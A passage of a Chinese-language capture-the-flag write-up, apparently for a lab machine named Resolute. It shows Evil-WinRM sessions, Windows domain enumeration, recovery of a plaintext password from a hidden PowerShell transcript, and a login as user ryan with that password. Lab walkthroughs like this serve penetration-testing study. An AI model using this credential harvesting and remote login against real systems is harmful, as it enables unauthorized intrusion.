class="hljs-keyword">Info</span>: Establishing <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> remote endpoint<br><br>*Evil-WinRM* PS C:\Users\melanie\Documents&gt; <br></code></pre></td></tr></table></figure><p>我成功了，并且我获取到了user.txt：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; <span class="hljs-keyword">cd</span> <span class="hljs-string">../desktop</span><br>*Evil-WinRM* PS C:\Users\melanie\desktop&gt; <span class="hljs-keyword">ls</span><br><br><br>    Directory: C:\Users\melanie\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>-ar<span class="hljs-params">---</span>        4/23/2022   2<span class="hljs-function">:16</span> AM             34 user.txt<br><br><br>*Evil-WinRM* PS C:\Users\melanie\desktop&gt; type user.txt<br></code></pre></td></tr></table></figure><h5 id="域侦察："><a href="#域侦察：" class="headerlink" title="域侦察："></a>域侦察：</h5><p>当前用户没什么权限：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\melanie\desktop&gt; whoami /pirv<br><br><span class="hljs-section">PRIVILEGES INFORMATION</span><br><span class="hljs-section">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled<br><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\melanie\desktop&gt; <br></code></pre></td></tr></table></figure><p>我可以看一眼详细信息：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\melanie&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">melanie</span><br><span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    melanie<br>Full Name<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last set            <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">4</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">53</span>:<span class="hljs-number">03</span> AM<br>Password required            Yes<br><span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes<br><br>Workstations allowed         All<br>Logon script<br><span class="hljs-keyword">User</span> <span class="hljs-title">profile</span><br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span>      *Remote Management Use<br>Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\melanie&gt; <br></code></pre></td></tr></table></figure><p>没什么信息，我可以看一眼它的组信息：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\melanie&gt; whoami /groups<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span><br>-----------------<br><br><span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                                 <span class="hljs-keyword">Type</span>             SID          <span class="hljs-keyword">Attributes</span><br>========================================== ================ ============ ==================================================<br>Everyone                                   Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Remote Management Users            Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">580</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Users                              Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Pre-Windows <span class="hljs-number">2000</span> Compatible Access Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span> Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NETWORK                       Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-2</span>      Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\Authenticated Users           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-11</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\This Organization             Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-15</span>     Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">NT</span> AUTHORITY\NTLM Authentication           Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-5-64-10</span>  Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">Mandatory</span> Label\Medium Mandatory Level     Label            S-<span class="hljs-number">1</span>-<span class="hljs-number">16</span>-<span class="hljs-number">8192</span><br>*Evil-WinRM* PS C:\Users\melanie&gt; <br></code></pre></td></tr></table></figure><p>没什么有用的，用户目录也没有什么有用的信息，在Users目录中会有一个ryan目录，该用户我觉得需要留意一下，最起码相比其他用户，这个用户是切切实实被用来登录过目标机器的：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs gradle">*Evil-WinRM* PS C:\Users&gt; ls<br><br><br>    Directory: C:\Users<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">43</span> AM                Administrator<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                melanie<br>d-r---       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">39</span> PM                <span class="hljs-keyword">Public</span><br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/27/</span><span class="hljs-number">2019</span>   <span class="hljs-number">7</span>:<span class="hljs-number">05</span> AM                ryan<br><br><br>*Evil-WinRM* PS C:\Users&gt; <br><br></code></pre></td></tr></table></figure><p>在根中，我发现了一些隐藏目录：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs awk">*Evil-WinRM* PS C:\&gt; ls<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">19</span> AM                PerfLogs<br>d-r---        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> PM                Program Files<br>d-----       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">36</span> PM                Program Files (x86)<br>d-r---        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                Users<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">5</span>:<span class="hljs-number">15</span> AM                Windows<br><br><br>*Evil-WinRM* PS C:\&gt; ls -force<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name<br>----                -------------         ------ ----<br>d--hs-        <span class="hljs-number">12</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">40</span> AM                <span class="hljs-variable">$RECYCLE</span>.BIN<br>d--hsl        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">17</span> AM                Documents and Settings<br>d-----        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">19</span> AM                PerfLogs<br>d-r---        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">12</span>:<span class="hljs-number">39</span> PM                Program Files<br>d-----       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">36</span> PM                Program Files (x86)<br>d--h--        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">48</span> AM                ProgramData<br>d--h--        <span class="hljs-number">12</span><span class="hljs-regexp">/3/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">32</span> AM                PSTranscripts<br>d--hs-        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>  <span class="hljs-number">10</span>:<span class="hljs-number">17</span> AM                Recovery<br>d--hs-        <span class="hljs-number">9</span><span class="hljs-regexp">/25/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span>:<span class="hljs-number">25</span> AM                System Volume Information<br>d-r---        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">2</span>:<span class="hljs-number">46</span> AM                Users<br>d-----        <span class="hljs-number">12</span><span class="hljs-regexp">/4/</span><span class="hljs-number">2019</span>   <span class="hljs-number">5</span>:<span class="hljs-number">15</span> AM                Windows<br>-arhs-       <span class="hljs-number">11</span><span class="hljs-regexp">/20/</span><span class="hljs-number">2016</span>   <span class="hljs-number">5</span>:<span class="hljs-number">59</span> PM         <span class="hljs-number">389408</span> bootmgr<br>-a-hs-        <span class="hljs-number">7</span><span class="hljs-regexp">/16/</span><span class="hljs-number">2016</span>   <span class="hljs-number">6</span>:<span class="hljs-number">10</span> AM              <span class="hljs-number">1</span> BOOTNXT<br>-a-hs-        <span class="hljs-number">4</span><span class="hljs-regexp">/23/</span><span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">15</span> AM      <span class="hljs-number">402653184</span> pagefile.sys<br><br><br>*Evil-WinRM* PS C:\&gt; <br></code></pre></td></tr></table></figure><p>PSTranscripts可不像是一个计算机本该有的目录，在它下边确实会有一个隐藏目录：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">*Evil-WinRM* PS C:\&gt; <span class="hljs-keyword">cd</span> PSTranscripts<br>*Evil-WinRM* PS C:\PSTranscripts&gt; <span class="hljs-keyword">ls</span><br>*Evil-WinRM* PS C:\PSTranscripts&gt; <span class="hljs-keyword">ls</span> -force<br><br><br>    Directory: C:\PSTranscripts<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-params">----</span>                <span class="hljs-params">-------------</span>         <span class="hljs-params">------</span> <span class="hljs-params">----</span><br>d<span class="hljs-params">--h--</span>        12/3/2019   6<span class="hljs-function">:45</span> AM                20191203<br><br>*Evil-WinRM* PS C:\PSTranscripts&gt; <br></code></pre></td></tr></table></figure><p>在隐藏目录中还会有一个隐藏文本文件：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">cd</span> <span class="hljs-number">20191203</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">dir</span><br><span class="hljs-operator">*</span><span class="hljs-variable">Evil</span><span class="hljs-operator">-</span><span class="hljs-variable">WinRM</span><span class="hljs-operator">*</span> <span class="hljs-variable">PS</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><span class="hljs-operator">&gt;</span> <span class="hljs-variable">ls</span> <span class="hljs-operator">-</span><span class="hljs-variable">force</span><br><br><br>    <span class="hljs-built_in">Directory</span><span class="hljs-operator">:</span> <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">PSTranscripts</span>\<span class="hljs-number">20191203</span><br><br><br><span class="hljs-built_in">Mode</span>                <span class="hljs-variable">LastWriteTime</span>         <span class="hljs-built_in">Length</span> <span class="hljs-variable">Name</span><br><span class="hljs-operator">----</span>                <span class="hljs-operator">-------------</span>         <span class="hljs-operator">------</span> <span class="hljs-operator">----</span><br><span class="hljs-operator">-</span><span class="hljs-variable">arh</span><span class="hljs-operator">--</span>        <span class="hljs-number">12</span><span class="hljs-operator">/</span><span class="hljs-number">3</span><span class="hljs-operator">/</span><span class="hljs-number">2019</span>   <span class="hljs-number">6</span><span class="hljs-operator">:</span><span class="hljs-number">45</span> <span class="hljs-variable">AM</span>           <span class="hljs-number">3732</span> <span class="hljs-type">PowerShell_transcript</span><span class="hljs-operator">.</span><span class="hljs-variable">RESOLUTE</span><span class="hljs-operator">.</span><span class="hljs-variable">OJuoBGhU</span><span class="hljs-number">.20191203063201</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure><p>我可以试着去看一眼，我删除了一些不必要的：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-comment">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt; type PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt</span><br><span class="hljs-comment">**********************</span><br>Windows PowerShell transcript start<br>Start time: 20191203063201<br>Username: MEGABANK\ryan<br>RunAs User: MEGABANK\ryan<br>......<br>Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding<br>......<br><span class="hljs-comment">**********************</span><br><span class="hljs-comment">**********************</span><br>......<br>PS&gt;CommandInvocation(Invoke-Expression): <span class="hljs-string">&quot;Invoke-Expression&quot;</span><br>&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="hljs-string">&quot;Command&quot;</span>; value=&quot;cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br><br>......<br>+ cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (The <span class="hljs-keyword">syntax</span> of this command is::String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>cmd : The <span class="hljs-keyword">syntax</span> of this command is:<br>At <span class="hljs-keyword">line</span>:1 <span class="hljs-keyword">char</span>:1<br>+ cmd /c <span class="hljs-keyword">net</span> <span class="hljs-keyword">use</span> X: \\fs01\backups ryan Serv3r4Admin4cc123!<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : NotSpecified: (The <span class="hljs-keyword">syntax</span> of this command is::String) [], RemoteException<br>    + FullyQualifiedErrorId : NativeCommandError<br>......<br><span class="hljs-comment">*Evil-WinRM* PS C:\PSTranscripts\20191203&gt;</span><br></code></pre></td></tr></table></figure><p>文本里边多次提到一个看起来像是一串密码的字符串”<strong>Serv3r4Admin4cc123!</strong>“,还有用户”<strong>ryan</strong>“。</p><h5 id="以ryan身份登录："><a href="#以ryan身份登录：" class="headerlink" title="以ryan身份登录："></a>以ryan身份登录：</h5><p>我可以试着用ryan登录：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">$ evil-winrm -i <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.169</span> -u ryan -p Serv3r4Admin4cc123!                      <br><br>Evil-WinRM shell v3<span class="hljs-number">.3</span><br><br><span class="hljs-built_in">Warning</span>: Remote <span class="hljs-type">path</span> completions <span class="hljs-keyword">is</span> disabled due <span class="hljs-keyword">to</span> ruby limitation: quoting_detection_proc() <span class="hljs-keyword">function</span> <span class="hljs-keyword">is</span> unimplemented <span class="hljs-keyword">on</span> this machine<br><br>Data: <span class="hljs-keyword">For</span> more information, <span class="hljs-keyword">check</span> Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-<span class="hljs-type">path</span>-completion<br><br><span class="hljs-keyword">Info</span>: Establishing <span class="hljs-keyword">connection</span> <span class="hljs-keyword">to</span> remote endpoint<br><br>*Evil-WinRM* PS C:\Users\ryan\Documents&gt; <br></code></pre></td></tr></table></figure><p>在ryan桌面有个笔记，里边记载了一些信息：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; ls<br><br><br>    Directory: C:\Users\ryan\desktop<br><br><br>Mode                LastWriteTime         Length Name<br><span class="hljs-comment">----                -------------         ------ ----</span><br>-ar<span class="hljs-comment">---        12/3/2019   7:34 AM            155 note.txt</span><br><br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; type note.txt<br>Email <span class="hljs-built_in">to</span> team:<br><br>- due <span class="hljs-built_in">to</span> change freeze, <span class="hljs-keyword">any</span> <span class="hljs-keyword">system</span> changes (apart <span class="hljs-built_in">from</span> those <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> administrator account) will be automatically reverted <span class="hljs-keyword">within</span> <span class="hljs-number">1</span> minute<br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>由于变更冻结的原因，系统变更(除管理员账户变更外)会在1分钟内自动恢复。算是一个提醒，但对于当下的我还没明白它对我有什么利弊。</p><p>当前用户没什么特殊权限：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-strong">*Evil-WinRM*</span> PS C:\Users\ryan\desktop&gt; whoami /priv<br><br><span class="hljs-section">PRIVILEGES INFORMATION</span><br><span class="hljs-section">----------------------</span><br><br>Privilege Name                Description                    State<br>============================= ============================== =======<br>SeMachineAccountPrivilege     Add workstations to domain     Enabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled<br></code></pre></td></tr></table></figure><p>我可以看一下它的具体信息：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net <span class="hljs-keyword">user</span> <span class="hljs-title">ryan</span><br><span class="hljs-keyword">User</span> <span class="hljs-title">name</span>                    ryan<br>Full Name                    Ryan Bertrand<br>Comment<br>User&#x27;s comment<br>Country/region code          <span class="hljs-number">000</span> (System Default)<br>Account active               Yes<br>Account expires              Never<br><br>Password last set            <span class="hljs-number">4</span>/<span class="hljs-number">23</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> AM<br>Password expires             Never<br>Password changeable          <span class="hljs-number">4</span>/<span class="hljs-number">24</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">52</span>:<span class="hljs-number">02</span> AM<br>Password required            Yes<br><span class="hljs-keyword">User</span> <span class="hljs-title">may</span> change password     Yes<br><br>Workstations allowed         All<br>Logon script<br><span class="hljs-keyword">User</span> <span class="hljs-title">profile</span><br>Home directory<br>Last logon                   Never<br><br>Logon hours allowed          All<br><br>Local <span class="hljs-keyword">Group</span> <span class="hljs-title">Memberships</span><br>Global <span class="hljs-keyword">Group</span> <span class="hljs-title">memberships</span>     *Domain Users         *Contractors<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>它并不在远程管理组中，那为什么我能远程登录到它呢？</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; net localgroup &quot;Remote Management Users&quot;<br><span class="hljs-keyword">Alias</span> <span class="hljs-type">name</span>     Remote Management Users<br><span class="hljs-keyword">Comment</span>        Members <span class="hljs-keyword">of</span> this <span class="hljs-keyword">group</span> can <span class="hljs-keyword">access</span> WMI resources <span class="hljs-keyword">over</span> management protocols (such <span class="hljs-keyword">as</span> WS-Management via the Windows Remote Management service). This applies <span class="hljs-keyword">only</span> <span class="hljs-keyword">to</span> WMI namespaces that <span class="hljs-keyword">grant</span> <span class="hljs-keyword">access</span> <span class="hljs-keyword">to</span> the <span class="hljs-keyword">user</span>.<br><br>Members<br><br><span class="hljs-comment">-------------------------------------------------------------------------------</span><br>Contractors<br>melanie<br>The command completed successfully.<br><br>*Evil-WinRM* PS C:\Users\ryan\desktop&gt; <br></code></pre></td></tr></table></figure><p>哦，ryan在Contractors里，而Contractors在远程管理组中，所以我才能远程登录。不过并不重要。我可以看一眼ryan用户详细组：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">*Evil-WinRM* PS C:\Users\ryan\desktop&gt; whoami /groups<br><br><span class="hljs-keyword">GROUP</span> <span class="hljs-title">INFORMATION</span><br>-----------------<br><br><span class="hljs-keyword">Group</span> <span class="hljs-title">Name</span>                                 <span class="hljs-keyword">Type</span>             SID                                            <span class="hljs-keyword">Attributes</span><br>========================================== ================ ============================================== ===============================================================<br>Everyone                                   Well-known <span class="hljs-keyword">group</span> <span class="hljs-title">S-1-1-0</span>                                        Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Users                              Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">545</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span class="hljs-title">BUILTIN</span>\Pre-Windows <span class="hljs-number">2000</span> Compatible Access Alias            S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">32</span>-<span class="hljs-number">554</span>                                   Mandatory group, Enabled by default, Enabled <span class="hljs-keyword">group</span><br><span 